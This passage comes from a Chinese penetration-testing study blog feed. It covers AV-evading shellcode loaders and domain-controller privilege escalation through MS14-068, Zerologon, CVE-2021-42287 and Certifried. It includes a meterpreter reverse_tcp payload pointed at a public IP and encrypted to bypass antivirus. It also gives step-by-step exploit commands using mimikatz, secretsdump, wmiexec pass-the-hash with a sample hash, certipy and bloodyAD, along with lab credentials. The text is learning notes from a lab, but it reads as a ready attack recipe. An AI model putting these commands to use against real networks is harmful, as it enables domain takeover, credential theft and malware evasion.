windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;47.94.236.117 lport&#x3D;6688 -f c </p><p><a href="https://blog.csdn.net/weixin_45590789/article/details/105536623">https://blog.csdn.net/weixin_45590789/article/details/105536623</a></p><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427152245386.png" alt="image-20230427152245386"></p><h6 id="填入后点击本地调试，会将shellcode进行Rc4加密"><a href="#填入后点击本地调试，会将shellcode进行Rc4加密" class="headerlink" title="填入后点击本地调试，会将shellcode进行Rc4加密"></a>填入后点击本地调试，会将shellcode进行Rc4加密</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427152513620.png" alt="image-20230427152513620"></p><h6 id="会自动弹出窗口"><a href="#会自动弹出窗口" class="headerlink" title="会自动弹出窗口"></a>会自动弹出窗口</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427152605327.png" alt="image-20230427152605327"></p><h6 id="将上面的内容再次替换刚才的"><a href="#将上面的内容再次替换刚才的" class="headerlink" title="将上面的内容再次替换刚才的"></a>将上面的内容再次替换刚才的</h6><p><img src="/../images/Day107-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-C-C-%E6%BA%AF%E6%BA%90ShellCode%E4%B8%8A%E7%BA%BF-%E6%B7%B7%E6%B7%86%E5%8F%98%E5%BC%82%E7%AE%97%E6%B3%95-%E5%9B%9E%E8%B0%83%E7%BC%96%E8%AF%91%E6%89%A7%E8%A1%8C/image-20230427152730636.png" alt="image-20230427152730636"></p><h6 id="编译成exe后，过了某绒、defender、但是还是没有过某60"><a href="#编译成exe后，过了某绒、defender、但是还是没有过某60" class="headerlink" title="编译成exe后，过了某绒、defender、但是还是没有过某60"></a>编译成exe后，过了某绒、defender、但是还是没有过某60</h6><h3 id="C-x2F-C-回调执行代码-汇编-amp-句柄-amp-API-amp-UI等"><a href="#C-x2F-C-回调执行代码-汇编-amp-句柄-amp-API-amp-UI等" class="headerlink" title="#C&#x2F;C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等"></a>#C&#x2F;C++-回调执行代码-汇编&amp;句柄&amp;API&amp;UI等</h3><p>Callback_Shellcode_Injection-main</p><p><a href="https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Day106 权限提升-WIN系统&amp;AD域控&amp;NetLogon&amp;ADCS&amp;PAC&amp;KDC&amp;CVE漏洞</title>
      <link href="/2023/04/17/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/04/17/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是域控？"><a href="#什么是域控？" class="headerlink" title="什么是域控？"></a>什么是域控？</h2><blockquote><h4 id="域控指的就是域控制器（Domain-Controller，DC），在一个域中，至少会有一个域控，是域的核心部分。安装了域控制器之后，就生成了域环境，但是若想生成域控制器，还需要一个东西，就是活动目录（Active-Directory，AD）。"><a href="#域控指的就是域控制器（Domain-Controller，DC），在一个域中，至少会有一个域控，是域的核心部分。安装了域控制器之后，就生成了域环境，但是若想生成域控制器，还需要一个东西，就是活动目录（Active-Directory，AD）。" class="headerlink" title="域控指的就是域控制器（Domain Controller，DC），在一个域中，至少会有一个域控，是域的核心部分。安装了域控制器之后，就生成了域环境，但是若想生成域控制器，还需要一个东西，就是活动目录（Active Directory，AD）。"></a>域控指的就是域控制器（Domain Controller，DC），在一个域中，至少会有一个域控，是域的核心部分。安装了<a href="https://so.csdn.net/so/search?q=%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8&spm=1001.2101.3001.7020">域控制器</a>之后，就生成了域环境，但是若想生成域控制器，还需要一个东西，就是活动目录（Active Directory，AD）。</h4></blockquote><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、WIN-域控提权-CVE-2014-6324</p><p>2、WIN-域控提权-CVE-2020-1472</p><p>3、WIN-域控提权-CVE-2021-42287</p><p>4、WIN-域控提权-CVE-2022-26923</p><h3 id="系列内容："><a href="#系列内容：" class="headerlink" title="#系列内容："></a>#系列内容：</h3><p>内核，数据库，第三方服务，SUID&amp;GUID，定时任务，环境变量，SUDO，权限不当等</p><p>脏牛漏洞(CVE-2016-5195)</p><p>Dirty Pipe(CVE-2022-0847)</p><p>SUDO(CVE-2021-3156）</p><p>Polkit(CVE-2021-4034)</p><h3 id="域控漏洞："><a href="#域控漏洞：" class="headerlink" title="域控漏洞："></a>域控漏洞：</h3><p>WIN-域控提权-CVE-2014-6324</p><p>WIN-域控提权-CVE-2020-1472</p><p>WIN-域控提权-CVE-2021-42287</p><p>WIN-域控提权-CVE-2022-26923</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><h4 id="➢-WIN-域控提权-CVE-2014-6324"><a href="#➢-WIN-域控提权-CVE-2014-6324" class="headerlink" title="➢ WIN-域控提权-CVE-2014-6324"></a>➢ WIN-域控提权-CVE-2014-6324</h4><h4 id="➢-WIN-域控提权-CVE-2020-1472"><a href="#➢-WIN-域控提权-CVE-2020-1472" class="headerlink" title="➢ WIN-域控提权-CVE-2020-1472"></a>➢ WIN-域控提权-CVE-2020-1472</h4><h4 id="➢-WIN-域控提权-CVE-2021-42287"><a href="#➢-WIN-域控提权-CVE-2021-42287" class="headerlink" title="➢ WIN-域控提权-CVE-2021-42287"></a>➢ WIN-域控提权-CVE-2021-42287</h4><h4 id="➢-WIN-域控提权-CVE-2022-26923"><a href="#➢-WIN-域控提权-CVE-2022-26923" class="headerlink" title="➢ WIN-域控提权-CVE-2022-26923"></a>➢ WIN-域控提权-CVE-2022-26923</h4></blockquote><h3 id="WIN-域控提权-CVE-2014-6324"><a href="#WIN-域控提权-CVE-2014-6324" class="headerlink" title="#WIN-域控提权-CVE-2014-6324"></a>#WIN-域控提权-CVE-2014-6324</h3><h5 id="MS14-068-CVE-2014-6324-域用户提权漏洞-ms14-068-exe-h领小白帽的博客-CSDN博客"><a href="#MS14-068-CVE-2014-6324-域用户提权漏洞-ms14-068-exe-h领小白帽的博客-CSDN博客" class="headerlink" title="MS14-068 (CVE-2014-6324)域用户提权漏洞_ms14-068.exe_h领小白帽的博客-CSDN博客"></a><a href="https://blog.csdn.net/weixin_46944519/article/details/123498421">MS14-068 (CVE-2014-6324)域用户提权漏洞_ms14-068.exe_h领小白帽的博客-CSDN博客</a></h5><h5 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h5><h5 id="1、需要域用户账号密码"><a href="#1、需要域用户账号密码" class="headerlink" title="1、需要域用户账号密码"></a>1、需要域用户账号密码</h5><h5 id="2、一台主机的管理员权限"><a href="#2、一台主机的管理员权限" class="headerlink" title="2、一台主机的管理员权限"></a>2、一台主机的管理员权限</h5><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425153419918.png" alt="image-20230425153419918"></p><ul><li><h6 id="1、whoami-x2F-user"><a href="#1、whoami-x2F-user" class="headerlink" title="1、whoami &#x2F;user"></a>1、whoami &#x2F;user</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425152618574.png" alt="image-20230425152618574"></p></li><li><h6 id="2、net-time-x2F-domain"><a href="#2、net-time-x2F-domain" class="headerlink" title="2、net time &#x2F;domain"></a>2、net time &#x2F;domain</h6></li></ul><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425152034308.png" alt="image-20230425152034308"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425152508661.png" alt="image-20230425152508661"></p><ul><li><h6 id="3、net-config-workstation"><a href="#3、net-config-workstation" class="headerlink" title="3、net config workstation"></a>3、net config workstation</h6></li><li><h6 id="4、ms14-068-exe-u-域成员名-域名-p-域成员密码-s-域成员sid-d-域控制器地址"><a href="#4、ms14-068-exe-u-域成员名-域名-p-域成员密码-s-域成员sid-d-域控制器地址" class="headerlink" title="4、ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址"></a>4、ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</h6><p>ms14-068.exe -u <a href="mailto:&#x6d;&#97;&#114;&#121;&#64;&#x67;&#x6f;&#100;&#46;&#111;&#114;&#103;">&#x6d;&#97;&#114;&#121;&#64;&#x67;&#x6f;&#100;&#46;&#111;&#114;&#103;</a> -p admin!@#45 -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d OWA2010CN-God.god.org（对应上面填写）</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155151454.png" alt="image-20230425155151454"></p><h6 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155515902.png" alt="image-20230425155515902"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155556830.png" alt="image-20230425155556830"></p><h6 id="将此文件复制到minikatz目录"><a href="#将此文件复制到minikatz目录" class="headerlink" title="将此文件复制到minikatz目录"></a>将此文件复制到minikatz目录</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160405403.png" alt="image-20230425160405403"></p></li><li><h6 id="5、启用minicatz"><a href="#5、启用minicatz" class="headerlink" title="5、启用minicatz"></a>5、启用minicatz</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155726349.png" alt="image-20230425155726349"></p></li><li><h6 id="minikatz执行"><a href="#minikatz执行" class="headerlink" title="minikatz执行"></a>minikatz执行</h6></li><li><p>kerberos::list（查看票据列表）</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160124484.png" alt="image-20230425160124484"></p></li><li><p>kerberos::purge  (清除票据)</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425155900065.png" alt="image-20230425155900065"></p></li><li><p>kerberos::ptc “<a href="mailto:&#84;&#x47;&#84;&#95;&#116;&#x65;&#115;&#116;&#48;&#50;&#64;&#x74;&#101;&#115;&#116;&#46;&#108;&#97;&#98;&#46;&#x63;&#99;&#97;&#x63;&#104;&#101;">&#84;&#x47;&#84;&#95;&#116;&#x65;&#115;&#116;&#48;&#50;&#64;&#x74;&#101;&#115;&#116;&#46;&#108;&#97;&#98;&#46;&#x63;&#99;&#97;&#x63;&#104;&#101;</a>“</p></li><li><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160519125.png" alt="image-20230425160519125"></p></li><li><h6 id="5、再次查看域控的C盘目录"><a href="#5、再次查看域控的C盘目录" class="headerlink" title="5、再次查看域控的C盘目录"></a>5、再次查看域控的C盘目录</h6><p>dir \OWA2010CN-God.god.org\C$</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160733043.png" alt="image-20230425160733043"></p></li><li><h6 id="7、使用PsExec工具获取域控shell-x2F-x2F-如果不行就PsExec64-exe以管理员权限运行连接域控"><a href="#7、使用PsExec工具获取域控shell-x2F-x2F-如果不行就PsExec64-exe以管理员权限运行连接域控" class="headerlink" title="7、使用PsExec工具获取域控shell &#x2F;&#x2F;如果不行就PsExec64.exe以管理员权限运行连接域控"></a>7、使用PsExec工具获取域控shell &#x2F;&#x2F;如果不行就PsExec64.exe以管理员权限运行连接域控</h6></li><li><p>psexec \OWA2010CN-God.god.org cmd</p></li></ul><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425160924426.png" alt="image-20230425160924426"></p><ul><li>ipconfig的ip显示的是域控的ip</li></ul><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425161121625.png" alt="image-20230425161121625"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425161100893.png" alt="image-20230425161100893"></p><h3 id="WIN-域控提权-CVE-2020-1472"><a href="#WIN-域控提权-CVE-2020-1472" class="headerlink" title="#WIN-域控提权-CVE-2020-1472"></a>#WIN-域控提权-CVE-2020-1472</h3><p>CVE-2020-1472是继MS17010之后好用的NetLogon特权域控提权漏洞，</p><p>影响Windows Server 2008R2至Windows Server 2019的多个版本系统，</p><p>只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞.</p><p>该漏洞不要求当前计算机在域内,也不要求当前计算机操作系统为Windows.</p><h5 id="1、获取计算机名：nbtscan-v-h-192-168-3-21"><a href="#1、获取计算机名：nbtscan-v-h-192-168-3-21" class="headerlink" title="1、获取计算机名：nbtscan -v -h 192.168.3.21"></a>1、获取计算机名：nbtscan -v -h 192.168.3.21</h5><h5 id="2、漏洞检测：python3-zerologon-tester-py-OWA2010CN-GOD-192-168-3-21"><a href="#2、漏洞检测：python3-zerologon-tester-py-OWA2010CN-GOD-192-168-3-21" class="headerlink" title="2、漏洞检测：python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21"></a>2、漏洞检测：python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21</h5><h5 id="3、重置为空密码：python3-cve-2020-1472-exploit-py-OWA2010CN-GOD-192-168-3-21"><a href="#3、重置为空密码：python3-cve-2020-1472-exploit-py-OWA2010CN-GOD-192-168-3-21" class="headerlink" title="3、重置为空密码：python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21"></a>3、重置为空密码：python3 cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21</h5><h5 id="4、连接后导出hash：python3-secretsdump-py-god-org-x2F-OWA2010CN-GOD-192-168-3-21-no-pass"><a href="#4、连接后导出hash：python3-secretsdump-py-god-org-x2F-OWA2010CN-GOD-192-168-3-21-no-pass" class="headerlink" title="4、连接后导出hash：python3 secretsdump.py god.org&#x2F;OWA2010CN-GOD$@192.168.3.21 -no-pass"></a>4、连接后导出hash：python3 secretsdump.py god.org&#x2F;OWA2010CN-GOD$@192.168.3.21 -no-pass</h5><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425140558083.png" alt="image-20230425140558083"></p><h6 id="可以获得所有域控内主机的密码hash值，这里要获取域内的hash，不是本地的"><a href="#可以获得所有域控内主机的密码hash值，这里要获取域内的hash，不是本地的" class="headerlink" title="可以获得所有域控内主机的密码hash值，这里要获取域内的hash，不是本地的"></a>可以获得所有域控内主机的密码hash值，这里要获取域内的hash，不是本地的<img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425141017289.png" alt="image-20230425141017289"></h6><h5 id="5、WMI连接反弹：python3-wmiexec-py-god-x2F-x61-100-x6d-105-x6e-x69-x73-116-114-x61-x74-111-114-x40-49-x39-50-46-49-x36-x38-x2e-51-46-50-49-hashes-aad3b435b51404eeaad3b435b51404ee-ccef208c6485269c20db2cad21734fe7（如果是连接本地那么要去掉god-x2F-administrator前的god）"><a href="#5、WMI连接反弹：python3-wmiexec-py-god-x2F-x61-100-x6d-105-x6e-x69-x73-116-114-x61-x74-111-114-x40-49-x39-50-46-49-x36-x38-x2e-51-46-50-49-hashes-aad3b435b51404eeaad3b435b51404ee-ccef208c6485269c20db2cad21734fe7（如果是连接本地那么要去掉god-x2F-administrator前的god）" class="headerlink" title="5、WMI连接反弹：python3 wmiexec.py god&#x2F;&#x61;&#100;&#x6d;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#51;&#46;&#50;&#49; -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7（如果是连接本地那么要去掉god&#x2F;administrator前的god）"></a>5、WMI连接反弹：python3 wmiexec.py god&#x2F;<a href="mailto:&#x61;&#100;&#x6d;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#51;&#46;&#50;&#49;">&#x61;&#100;&#x6d;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#x40;&#49;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#51;&#46;&#50;&#49;</a> -hashes aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7（如果是连接本地那么要去掉god&#x2F;administrator前的god）</h5><h3 id="WIN-域控提权-CVE-2021-42287"><a href="#WIN-域控提权-CVE-2021-42287" class="headerlink" title="#WIN-域控提权-CVE-2021-42287"></a>#WIN-域控提权-CVE-2021-42287</h3><p><a href="https://cloud.tencent.com/developer/article/2097964">CVE-2021-42287 CVE-2021-42278域提权漏洞复现 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>只需要域用户账号密码</p><p>脚本地址：<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><p>python3 sam_the_admin.py 域名字&#x2F;域用户 :’域用户密码’ -dc-ip 域控ip地址 -shell</p><p>python3 sam_the_admin.py god&#x2F;‘mary:admin!@#45’ -dc-ip 192.168.3.21 -shell</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425140032663.png" alt="image-20230425140032663"></p><h6 id="获得system权限"><a href="#获得system权限" class="headerlink" title="获得system权限"></a>获得system权限</h6><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425140113254.png" alt="image-20230425140113254"></p><h3 id="WIN-域控提权-CVE-2022-26923"><a href="#WIN-域控提权-CVE-2022-26923" class="headerlink" title="#WIN-域控提权-CVE-2022-26923"></a>#WIN-域控提权-CVE-2022-26923</h3><h5 id="前提条件：-1"><a href="#前提条件：-1" class="headerlink" title="前提条件："></a>前提条件：</h5><h5 id="1、一个域内普通账号"><a href="#1、一个域内普通账号" class="headerlink" title="1、一个域内普通账号"></a>1、一个域内普通账号</h5><h5 id="2、域内存在证书服务器"><a href="#2、域内存在证书服务器" class="headerlink" title="2、域内存在证书服务器"></a>2、域内存在证书服务器<img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425145804131.png" alt="image-20230425145804131"></h5><h5 id="Kali添加访问域内信息-x2F-etc-x2F-hosts"><a href="#Kali添加访问域内信息-x2F-etc-x2F-hosts" class="headerlink" title="Kali添加访问域内信息 &#x2F;etc&#x2F;hosts"></a>Kali添加访问域内信息 &#x2F;etc&#x2F;hosts</h5><p>192.168.1.15 xiaodi.local</p><p>192.168.1.15 xiaodi-WIN-3C7SS32SQ6R-CA</p><p>192.168.1.15 WIN-3C7SS32SQ6R.xiaodi.local</p><h5 id="获取CA结构名和计算机名"><a href="#获取CA结构名和计算机名" class="headerlink" title="获取CA结构名和计算机名"></a>获取CA结构名和计算机名</h5><p>certutil -config - -ping</p><p>会出现</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425145210230.png" alt="image-20230425145210230"></p><h5 id="域内信息"><a href="#域内信息" class="headerlink" title="域内信息"></a>域内信息</h5><p>192.168.1.15</p><p>test Pass123</p><p>xiaodi-WIN-3C7SS32SQ6R-CA</p><p>WIN-3C7SS32SQ6R.xiaodi.local</p><h5 id="1、申请证书"><a href="#1、申请证书" class="headerlink" title="1、申请证书"></a>1、申请证书</h5><p>certipy req ‘xiaodi.local&#x2F;test:<a href="mailto:&#80;&#x61;&#115;&#x73;&#49;&#x32;&#51;&#64;&#x57;&#73;&#78;&#45;&#x33;&#x43;&#x37;&#83;&#83;&#51;&#x32;&#83;&#81;&#54;&#82;&#x2e;&#120;&#105;&#x61;&#x6f;&#100;&#105;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#x6c;">&#80;&#x61;&#115;&#x73;&#49;&#x32;&#51;&#64;&#x57;&#73;&#78;&#45;&#x33;&#x43;&#x37;&#83;&#83;&#51;&#x32;&#83;&#81;&#54;&#82;&#x2e;&#120;&#105;&#x61;&#x6f;&#100;&#105;&#x2e;&#x6c;&#x6f;&#99;&#x61;&#x6c;</a>‘ -ca xiaodi-WIN-3C7SS32SQ6R-CA -template User -debug</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150245365.png" alt="image-20230425150245365"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150350812.png" alt="image-20230425150350812"></p><h5 id="2、检测证书"><a href="#2、检测证书" class="headerlink" title="2、检测证书"></a>2、检测证书</h5><p>certipy auth -pfx test.pfx</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150424218.png" alt="image-20230425150424218"></p><h5 id="3、添加用户："><a href="#3、添加用户：" class="headerlink" title="3、添加用户："></a>3、添加用户：</h5><p>python3 bloodyAD.py -d xiaodi.local -u test -p ‘Pass123’ –host 192.168.1.15 addComputer pwnmachine ‘CVEPassword1234*’</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150521712.png" alt="image-20230425150521712"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150722870.png" alt="image-20230425150722870"></p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150818373.png" alt="image-20230425150818373"></p><h5 id="4、设置属性："><a href="#4、设置属性：" class="headerlink" title="4、设置属性："></a>4、设置属性：</h5><p>python3 bloodyAD.py -d xiaodi.local -u test -p ‘Pass123’ –host 192.168.1.15 setAttribute ‘CN&#x3D;pwnmachine,CN&#x3D;Computers,DC&#x3D;xiaodi,DC&#x3D;local’ dNSHostName ‘[“WIN-3C7SS32SQ6R.xiaodi.local”]’</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150845922.png" alt="image-20230425150845922"></p><h5 id="5、申请证书："><a href="#5、申请证书：" class="headerlink" title="5、申请证书："></a>5、申请证书：</h5><p>certipy req ‘xiaodi.local&#x2F;pwnmachine$:CVEPassword1234*@192.168.1.15’ -template Machine -dc-ip 192.168.1.15 -ca xiaodi-WIN-3C7SS32SQ6R-CA</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425150942298.png" alt="image-20230425150942298"></p><h5 id="6、检测证书："><a href="#6、检测证书：" class="headerlink" title="6、检测证书："></a>6、检测证书：</h5><p>certipy auth -pfx .&#x2F;win-3c7ss32sq6r.pfx -dc-ip 192.168.1.15</p><p><img src="/../images/Day106-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-WIN%E7%B3%BB%E7%BB%9F-AD%E5%9F%9F%E6%8E%A7-NetLogon-ADCS-PAC-KDC-CVE%E6%BC%8F%E6%B4%9E/image-20230425151025181.png" 